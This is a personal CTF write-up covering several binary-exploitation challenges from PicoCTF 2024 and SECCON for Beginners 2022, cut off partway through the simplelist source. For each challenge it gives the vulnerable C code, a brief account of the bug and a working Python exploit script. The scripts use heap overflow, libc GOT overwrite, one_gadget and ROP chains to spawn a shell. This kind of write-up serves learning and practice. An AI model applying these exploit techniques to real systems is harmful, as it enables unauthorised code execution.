<script lang="ts">
</script>

<p>because this writeup is for my remind, it is very rough and might be incorrect especially &quot;high frequency troubles&quot;.</p>
<h1>4/27 PicoCTF 2024 High Frequency Troubles</h1>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdint.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">enum
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    PKT_OPT_PING,
</span><span style="color:#d4be98;">    PKT_OPT_ECHO,
</span><span style="color:#d4be98;">    PKT_OPT_TRADE,
</span><span style="color:#d4be98;">&#125; typedef pkt_opt_t;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">enum
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    PKT_MSG_INFO,
</span><span style="color:#d4be98;">    PKT_MSG_DATA,
</span><span style="color:#d4be98;">&#125; typedef pkt_msg_t;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">struct
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    size_t sz;
</span><span style="color:#d4be98;">    uint64_t data[];
</span><span style="color:#d4be98;">&#125; typedef pkt_t;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">const struct
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    char *header;
</span><span style="color:#d4be98;">    char *color;
</span><span style="color:#d4be98;">&#125; type_tbl[] = &#123;
</span><span style="color:#d4be98;">    [PKT_MSG_INFO] = &#123;&quot;PKT_INFO&quot;, &quot;\x1b[1;34m&quot;&#125;,
</span><span style="color:#d4be98;">    [PKT_MSG_DATA] = &#123;&quot;PKT_DATA&quot;, &quot;\x1b[1;33m&quot;&#125;,
</span><span style="color:#d4be98;">&#125;;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void putl(pkt_msg_t type, char *msg)
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    printf(&quot;%s%s\x1b[m:[%s]\n&quot;, type_tbl[type].color, type_tbl[type].header, msg);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">// gcc main.c -o hft -g
</span><span style="color:#d4be98;">int main()
</span><span style="color:#d4be98;">&#123;
</span><span style="color:#d4be98;">    setbuf(stdout, NULL);
</span><span style="color:#d4be98;">    setbuf(stdin, NULL);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    putl(PKT_MSG_INFO, &quot;BOOT_SQ&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    for (;;)
</span><span style="color:#d4be98;">    &#123;
</span><span style="color:#d4be98;">        putl(PKT_MSG_INFO, &quot;PKT_RES&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        size_t sz = 0;
</span><span style="color:#d4be98;">        fread(&amp;sz, sizeof(size_t), 1, stdin);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        pkt_t *pkt = malloc(sz);
</span><span style="color:#d4be98;">        pkt-&gt;sz = sz;
</span><span style="color:#d4be98;">        gets(&amp;pkt-&gt;data);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        switch (pkt-&gt;data[0])
</span><span style="color:#d4be98;">        &#123;
</span><span style="color:#d4be98;">        case PKT_OPT_PING:
</span><span style="color:#d4be98;">            putl(PKT_MSG_DATA, &quot;PONG_OK&quot;);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case PKT_OPT_ECHO:
</span><span style="color:#d4be98;">            putl(PKT_MSG_DATA, (char *)&amp;pkt-&gt;data[1]);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        default:
</span><span style="color:#d4be98;">            putl(PKT_MSG_INFO, &quot;E_INVAL&quot;);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    putl(PKT_MSG_INFO, &quot;BOOT_EQ&quot;);
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>Sending packet, it was separated to 3 parts, size, type and data.
There was a heap overflow bug in receiving data. And this program didn't have any free call.</p>
<h2>Strategy</h2>
<ul>
<li>In first, I overwrited size of topchunk to smaller value, and called malloc with a size greater than new size of topchunk to free top chunk. When I called malloc after freeing topchunk, a heap address was left in new malloced chunk so, I leaked heap address from it.</li>
<li>Next, I called malloc with the size which will cause mmap syscall. The chunk from mmap was near Thread Local Storage. So, I overwrited the address of Tcache Perthread Struct to my fake struct I sent, to manipulate tcache. By manipulating tcache I leaked glibc address, and I did GOT overwrite in libc to one_gadget by same technique of libc leak.</li>
</ul>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">import ptrlib as ptr
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">elf = ptr.ELF(&quot;./hft_patched&quot;)
</span><span style="color:#d4be98;">libc = ptr.ELF(&quot;libc.so.6&quot;)
</span><span style="color:#d4be98;">io = ptr.Process(elf.filepath)
</span><span style="color:#d4be98;"># io = ptr.Socket(&quot;tethys.picoctf.net&quot;, 55233)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def send(sz, content, option=1):
</span><span style="color:#d4be98;">    io.recvuntil(b&quot;PKT_RES&quot;)
</span><span style="color:#d4be98;">    io.send(p32(sz))
</span><span style="color:#d4be98;">    if len(content) != 0:
</span><span style="color:#d4be98;">        payload = p32(0) + p64(option) + content
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        payload = p32(0) + b&quot;\x01\0\0\0\0\0&quot;
</span><span style="color:#d4be98;">    io.sendline(payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">p64 = ptr.p64
</span><span style="color:#d4be98;">p32 = ptr.p32
</span><span style="color:#d4be98;">u64 = ptr.u64
</span><span style="color:#d4be98;">info = ptr.logger.info
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">## LEAK HEAP ADDRESS
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">send(0x10, b&quot;&quot;)
</span><span style="color:#d4be98;">send(0x10, b&quot;A&quot; * 8 + p64(0xD31))
</span><span style="color:#d4be98;">send(0x1000, b&quot;B&quot; * (0x1000 - 16))
</span><span style="color:#d4be98;">send(0x8, b&quot;&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.recvuntil(b&quot;:[&quot;)
</span><span style="color:#d4be98;">heap_base = u64(io.recvline().strip(b&quot;]&quot;)) - 0x2D0
</span><span style="color:#d4be98;">info(&quot;HEAP BASE: &quot; + hex(heap_base))
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">## LEAK LIBC ADDRESS
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;C&quot; * (8 * 6)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x380)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">send(0x80, payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;D&quot; * 0x316D8 + p64(heap_base + 0x340 - 0x80)
</span><span style="color:#d4be98;">send(0x30001, payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">send(0x10, b&quot;&quot;)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;:[&quot;)
</span><span style="color:#d4be98;">libc.base = u64(io.recvline().strip(b&quot;]&quot;)) - 0x21A2E0
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">## OVERWRITE GOT IN LIBC
</span><span style="color:#d4be98;">######################
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;"># 全ては調べてないが、少なくとも以下の２つのGOTは書き換えるとシェルを取れる。
</span><span style="color:#d4be98;">got_addr = libc.base + 0x219098
</span><span style="color:#d4be98;"># got_addr = libc.base + 0x219090
</span><span style="color:#d4be98;">info(f&quot;GOT ADDRESS BEING OVERWRITTEN: &#123;hex(got_addr)&#125;&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;F&quot; * 0x626D8 + p64(heap_base + 0x350 - 0x80)
</span><span style="color:#d4be98;">send(0x30001, payload, 0)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;E&quot; * (8 * 6)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">if got_addr % 0x10 == 0:
</span><span style="color:#d4be98;">    payload += p64(got_addr)
</span><span style="color:#d4be98;">else:
</span><span style="color:#d4be98;">    payload += p64(got_addr - 8)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">payload += p64(heap_base + 0x300)
</span><span style="color:#d4be98;">send(0x10, payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">one_gadget = 0xEBCF5
</span><span style="color:#d4be98;">io.send(p64(0x10))
</span><span style="color:#d4be98;">io.send(p64(libc.base + one_gadget))
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.recvuntil(b&quot;[PKT_RES]&quot;)
</span><span style="color:#d4be98;">io.sendline(p64(0x10))
</span><span style="color:#d4be98;">io.sh()
</span></code></pre>
<h1>5/7 SECCON for Beginners 2022 BeginnersBof</h1>
<p>I got a program and its source code. <code>chall</code> and <code>src.c</code></p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;sys/types.h&gt;
</span><span style="color:#d4be98;">#include &lt;sys/stat.h&gt;
</span><span style="color:#d4be98;">#include &lt;fcntl.h&gt;
</span><span style="color:#d4be98;">#include &lt;unistd.h&gt;
</span><span style="color:#d4be98;">#include &lt;err.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define BUFSIZE 0x10
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void win() &#123;
</span><span style="color:#d4be98;">    char buf[0x100];
</span><span style="color:#d4be98;">    int fd = open(&quot;flag.txt&quot;, O_RDONLY);
</span><span style="color:#d4be98;">    if (fd == -1)
</span><span style="color:#d4be98;">        err(1, &quot;Flag file not found...\n&quot;);
</span><span style="color:#d4be98;">    write(1, buf, read(fd, buf, sizeof(buf)));
</span><span style="color:#d4be98;">    close(fd);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">    int len = 0;
</span><span style="color:#d4be98;">    char buf[BUFSIZE] = &#123;0&#125;;
</span><span style="color:#d4be98;">    puts(&quot;How long is your name?&quot;);
</span><span style="color:#d4be98;">    scanf(&quot;%d&quot;, &amp;len);
</span><span style="color:#d4be98;">    char c = getc(stdin);
</span><span style="color:#d4be98;">    if (c != &#39;\n&#39;)
</span><span style="color:#d4be98;">        ungetc(c, stdin);
</span><span style="color:#d4be98;">    puts(&quot;What&#39;s your name?&quot;);
</span><span style="color:#d4be98;">    fgets(buf, len, stdin);
</span><span style="color:#d4be98;">    printf(&quot;Hello %s&quot;, buf);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">__attribute__((constructor))
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">    setvbuf(stdin, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    setvbuf(stdout, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    alarm(60);
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p><code>main</code> function has buffer overflow vulnerability obviously.
I can set length of the buffer which will save my input.
Therefore, I just overwrite a return address of the <code>main</code> to <code>win</code></p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">import ptrlib as p
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def unwrap(x):
</span><span style="color:#d4be98;">    if x is None:
</span><span style="color:#d4be98;">        exit(1)
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return x
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">elf = p.ELF(&quot;./chall&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">offset = 40
</span><span style="color:#d4be98;">payload = b&quot;A&quot; * offset
</span><span style="color:#d4be98;">payload += p.p64(unwrap(elf.symbol(&quot;win&quot;)))
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io = p.Process(elf.filepath)
</span><span style="color:#d4be98;">io.sendline(str(len(payload)))
</span><span style="color:#d4be98;">io.sendline(payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">flag_content = io.recvregex(b&quot;flag\&#123;(.*?)\&#125;&quot;)[0].decode()
</span><span style="color:#d4be98;">flag = &quot;flag&#123;&quot; + flag_content + &quot;&#125;&quot;
</span><span style="color:#d4be98;">p.logger.info(f&quot;flag: &#123;flag&#125;&quot;)
</span></code></pre>
<h1>5/8 SECCON for Beginners 2022 Raindrop</h1>
<p>Source code was given.</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;unistd.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define BUFF_SIZE 0x10
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void help() &#123;
</span><span style="color:#d4be98;">    system(&quot;cat welcome.txt&quot;);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void show_stack(void *);
</span><span style="color:#d4be98;">void vuln();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">    vuln();
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void vuln() &#123;
</span><span style="color:#d4be98;">    char buf[BUFF_SIZE] = &#123;0&#125;;
</span><span style="color:#d4be98;">    show_stack(buf);
</span><span style="color:#d4be98;">    puts(&quot;You can earn points by submitting the contents of flag.txt&quot;);
</span><span style="color:#d4be98;">    puts(&quot;Did you understand?&quot;) ;
</span><span style="color:#d4be98;">    read(0, buf, 0x30);
</span><span style="color:#d4be98;">    puts(&quot;bye!&quot;);
</span><span style="color:#d4be98;">    show_stack(buf);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void show_stack(void *ptr) &#123;
</span><span style="color:#d4be98;">    puts(&quot;stack dump...&quot;);
</span><span style="color:#d4be98;">    printf(&quot;\n%-8s|%-20s\n&quot;, &quot;[Index]&quot;, &quot;[Value]&quot;);
</span><span style="color:#d4be98;">    puts(&quot;========+===================&quot;);
</span><span style="color:#d4be98;">    for (int i = 0; i &lt; 5; i++) &#123;
</span><span style="color:#d4be98;">        unsigned long *p = &amp;((unsigned long*)ptr)[i];
</span><span style="color:#d4be98;">        printf(&quot; %06d | 0x%016lx &quot;, i, *p);
</span><span style="color:#d4be98;">        if (p == ptr)
</span><span style="color:#d4be98;">            printf(&quot; &lt;- buf&quot;);
</span><span style="color:#d4be98;">        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
</span><span style="color:#d4be98;">            printf(&quot; &lt;- saved rbp&quot;);
</span><span style="color:#d4be98;">        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
</span><span style="color:#d4be98;">            printf(&quot; &lt;- saved ret addr&quot;);
</span><span style="color:#d4be98;">        puts(&quot;&quot;);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">    puts(&quot;finish&quot;);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">__attribute__((constructor))
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">    setvbuf(stdin, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    setvbuf(stdout, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    help();
</span><span style="color:#d4be98;">    alarm(60);
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>In <code>vuln</code> function, buffer overflow bug was existing in which I can overwrite 24 extra bytes.
Ths string <code>&quot;finish&quot;</code> contained <code>&quot;sh&quot;</code> and <code>system</code> was used in <code>help</code>, so I used them to create a rop chain.</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">import ptrlib as ptr
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def unwrap(x):
</span><span style="color:#d4be98;">    if x is None:
</span><span style="color:#d4be98;">        exit(1)
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return x
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">elf = ptr.ELF(&quot;./chall&quot;)
</span><span style="color:#d4be98;">io = ptr.Process(elf.filepath)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;A&quot; * 24
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rdi; ret&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.find(b&quot;sh\x00&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0x00000000004011E5)  # help+15 ie. system()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">ptr.logger.info(f&quot;payload length: &#123;len(payload)&#125;&quot;)
</span><span style="color:#d4be98;">if len(payload) &gt; 48:
</span><span style="color:#d4be98;">    ptr.logger.error(&quot;payload length is too long!&quot;)
</span><span style="color:#d4be98;">    exit()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.sendline(payload)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;finish&quot;)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;finish&quot;)
</span><span style="color:#d4be98;">io.sh()
</span></code></pre>
<h1>5/9 SECCON for Beginners 2022 Snowdrop</h1>
<p>It was a typical ROP problem.</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;unistd.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define BUFF_SIZE 0x10
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void show_stack(void *);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">    char buf[BUFF_SIZE] = &#123;0&#125;;
</span><span style="color:#d4be98;">    show_stack(buf);
</span><span style="color:#d4be98;">    puts(&quot;You can earn points by submitting the contents of flag.txt&quot;);
</span><span style="color:#d4be98;">    puts(&quot;Did you understand?&quot;) ;
</span><span style="color:#d4be98;">    gets(buf);
</span><span style="color:#d4be98;">    puts(&quot;bye!&quot;);
</span><span style="color:#d4be98;">    show_stack(buf);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void show_stack(void *ptr) &#123;
</span><span style="color:#d4be98;">    puts(&quot;stack dump...&quot;);
</span><span style="color:#d4be98;">    printf(&quot;\n%-8s|%-20s\n&quot;, &quot;[Index]&quot;, &quot;[Value]&quot;);
</span><span style="color:#d4be98;">    puts(&quot;========+===================&quot;);
</span><span style="color:#d4be98;">    for (int i = 0; i &lt; 8; i++) &#123;
</span><span style="color:#d4be98;">        unsigned long *p = &amp;((unsigned long*)ptr)[i];
</span><span style="color:#d4be98;">        printf(&quot; %06d | 0x%016lx &quot;, i, *p);
</span><span style="color:#d4be98;">        if (p == ptr)
</span><span style="color:#d4be98;">            printf(&quot; &lt;- buf&quot;);
</span><span style="color:#d4be98;">        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
</span><span style="color:#d4be98;">            printf(&quot; &lt;- saved rbp&quot;);
</span><span style="color:#d4be98;">        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
</span><span style="color:#d4be98;">            printf(&quot; &lt;- saved ret addr&quot;);
</span><span style="color:#d4be98;">        puts(&quot;&quot;);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">    puts(&quot;finish&quot;);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">__attribute__((constructor))
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">    setvbuf(stdin, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    setvbuf(stdout, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">    alarm(60);
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>In <code>main</code> function, it had a buffer overflow bug that allows an attacker to overwrite the stack without any limit.
According to the <code>checksec</code> , the program has stack canary. However, I couldn't find any stuff likes canary, so I did debug and I realized that if saved rbp was not changed, overflow was not detected. Saved rbp can be fetched from output of the program, so I inserted saved rbp in front of ROP chain.</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/home/ryohz/.pyenv/shims/python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">import ptrlib as ptr
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def unwrap(x):
</span><span style="color:#d4be98;">    if x is None:
</span><span style="color:#d4be98;">        ptr.logger.error(&quot;failed to unwrap&quot;)
</span><span style="color:#d4be98;">        exit(1)
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return x
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">elf = ptr.ELF(&quot;./chall&quot;)
</span><span style="color:#d4be98;">io = ptr.Process(elf.filepath)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.recvuntil(b&quot;========+===================&quot;)
</span><span style="color:#d4be98;">io.recvline()
</span><span style="color:#d4be98;">io.recvline()
</span><span style="color:#d4be98;">io.recvline()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">rbp = int(io.recvline().split(b&quot; | &quot;)[1].strip(b&quot;  &lt;- saved rbp&quot;), 16)
</span><span style="color:#d4be98;">ptr.logger.info(f&quot;rbp: &#123;hex(rbp)&#125;&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;A&quot; * 16
</span><span style="color:#d4be98;">payload += ptr.p64(rbp)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rdx; ret;&quot;)))
</span><span style="color:#d4be98;">payload += b&quot;/bin/sh\x00&quot;
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rax; ret;&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0x4BD000)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;mov [rax], rdx; pop rbx; ret;&quot;)))
</span><span style="color:#d4be98;">payload += b&quot;AAAAAAAA&quot;
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rdi; ret;&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0x4BD000)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rsi; ret;&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rdx; ret;&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;pop rax; ret;&quot;)))
</span><span style="color:#d4be98;">payload += ptr.p64(0x3b)
</span><span style="color:#d4be98;">payload += ptr.p64(next(elf.gadget(&quot;syscall; ret;&quot;)))
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.sendline(payload)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;finish&quot;)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;finish&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.sh()
</span></code></pre>
<h1>5/10 SECCON for Beginners 2022 simplelist</h1>
<p>Following source code was given. According to my search, problem must has contained<code>glibc-2.33</code>in competition however, its github archive doesn't contain libc.</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#define DEBUG 1
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#include &quot;list.h&quot;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int read_int() &#123;
</span><span style="color:#d4be98;">  char buf[0x10];
</span><span style="color:#d4be98;">  buf[read(0, buf, 0xf)] = 0;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  return atoi(buf);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void create() &#123;
</span><span style="color:#d4be98;">  Memo *e = malloc(sizeof(Memo));
</span><span style="color:#d4be98;">#if DEBUG
</span><span style="color:#d4be98;">  printf(&quot;[debug] new memo allocated at %p\n&quot;, e);
</span><span style="color:#d4be98;">#endif
</span><span style="color:#d4be98;">  if (e == NULL)
</span><span style="color:#d4be98;">    err(1, &quot;%s\n&quot;, strerror(errno));
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  printf(&quot;Content: &quot;);
</span><span style="color:#d4be98;">  gets(e-&gt;content);
</span><span style="color:#d4be98;">  e-&gt;next = NULL;
</span><span style="color:#d4be98;">  list_add(e);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void edit() &#123;
</span><span style="color:#d4be98;">  printf(&quot;index: &quot;);
</span><span style="color:#d4be98;">  int index = read_int();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  Memo *e = list_nth(index);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  if (e == NULL) &#123;
</span><span style="color:#d4be98;">    puts(&quot;Not found...&quot;);
</span><span style="color:#d4be98;">    return;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#if DEBUG
</span><span style="color:#d4be98;">  printf(&quot;[debug] editing memo at %p\n&quot;, e);
</span><span style="color:#d4be98;">#endif
</span><span style="color:#d4be98;">  printf(&quot;Old content: &quot;);
</span><span style="color:#d4be98;">  puts(e-&gt;content);
</span><span style="color:#d4be98;">  printf(&quot;New content: &quot;);
</span><span style="color:#d4be98;">  gets(e-&gt;content);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void show() &#123;
</span><span style="color:#d4be98;">  Memo *e = memo_list;
</span><span style="color:#d4be98;">  if (e == NULL) &#123;
</span><span style="color:#d4be98;">    puts(&quot;List empty&quot;);
</span><span style="color:#d4be98;">    return;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  puts(&quot;\nList of current memos&quot;);
</span><span style="color:#d4be98;">  puts(&quot;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-&quot;);
</span><span style="color:#d4be98;">  for (int i = 0; e != NULL; e = e-&gt;next) &#123;
</span><span style="color:#d4be98;">#if DEBUG
</span><span style="color:#d4be98;">    printf(&quot;[debug] memo_list[%d](%p)-&gt;content(%p) %s\n&quot;, i, e, e-&gt;content,
</span><span style="color:#d4be98;">           e-&gt;content);
</span><span style="color:#d4be98;">    printf(&quot;[debug] next(%p): %p\n&quot;, &amp;e-&gt;next, e-&gt;next);
</span><span style="color:#d4be98;">#else
</span><span style="color:#d4be98;">    printf(&quot;memo_list[%d] %s\n&quot;, i, e-&gt;content);
</span><span style="color:#d4be98;">#endif
</span><span style="color:#d4be98;">    i++;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  puts(&quot;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\n&quot;);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void menu() &#123;
</span><span style="color:#d4be98;">  puts(&quot;&quot;);
</span><span style="color:#d4be98;">  puts(&quot;1. Create new memo&quot;);
</span><span style="color:#d4be98;">  puts(&quot;2. Edit existing memo&quot;);
</span><span style="color:#d4be98;">  puts(&quot;3. Show memo&quot;);
</span><span style="color:#d4be98;">  puts(&quot;4. Exit&quot;);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">  puts(&quot;Welcome to memo organizer&quot;);
</span><span style="color:#d4be98;">  menu();
</span><span style="color:#d4be98;">  printf(&quot;&gt; &quot;);
</span><span style="color:#d4be98;">  int cmd = read_int();
</span><span style="color:#d4be98;">  while (1) &#123;
